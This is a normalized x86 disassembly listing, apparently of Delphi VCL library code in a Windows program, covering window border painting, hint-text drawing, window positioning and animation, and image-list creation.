sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_454519
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_454140
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44e1dc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_454558
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44f060
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_44caf4
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_4545a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f280
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4545d0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_450320
xor ecx ecx
push ebp
push sub_4546ff
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4507b8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454706
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_450328
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45077c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_454706
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40338c
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40338c
jmp r-xdata
sub_45479c
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e340
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e340
sub_4547e0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44e340
sub_454850
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_4548e0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_454b46
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424240
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43c850
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43d1dc
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_454b88
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b00
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_44ccd0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_451374
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44e340
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44f504
sub_454bf4
push ebx
push esi
mov esi edx
call sub_464518
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406a94
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44e340
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406a94
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44e340
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_454c58
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_45173c
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_454c90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_454c88
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_454cd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c28c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_44bd68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_454d2c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c364
test bl bl
jle r-xdata
xor eax eax
call sub_44a35c
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_454d6c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424660
xor eax eax
push ebp
push sub_454e07
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424a8c
xor eax eax
push ebp
push sub_454de4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454deb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_424a8c
retn
sub_454e18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455750
mov edx 0x80ffff
mov eax esi
call sub_44d32c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_42492c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424328
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_454e84
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_450914
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c094
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4508ac
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_454ef0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454f46
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454f4d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ReleaseDC
retn
sub_454f54
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_454fed
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_423a40
mov eax ebx
call sub_44f4ac
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x14 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x208 ]
call sub_424a0c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454ff4
lea eax [ ebp - 0x14 ]
call sub_403f20
retn
sub_454ffc
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_455068
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_4550f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4550fa
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44d18c
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_42486c
mov edx eax
add edx 0x6
mov eax esi
call sub_44c948
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44d18c
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_424888
mov edx eax
add edx 0x4
mov eax esi
call sub_44c96c
sub_455100
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4552d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d1bc
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44e3e4
mov eax [ esi ]
call sub_46ad50
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46ad5c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46ad50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_46ad44
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_46ad5c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_46ad38
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_46ad44
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_46ad38
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4511bc
push 0x4
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552e0
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4041e0
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_458398
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call [ rw-data ]
sub_4552e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_455310
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_416e34
mov eax esi
call sub_44f4ac
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ esi + 0x208 ]
call sub_424a0c
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45536c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416e34
call sub_43c850
call sub_43c930
test al al
jne r-xdata
call sub_43c850
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43ce50
push esp
push 0x1
push 0xf
push 0x0
call sub_43c850
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43c9f0
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4553d8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_451ac4
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_4553fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_455454
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455514
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b224
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42acf0
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
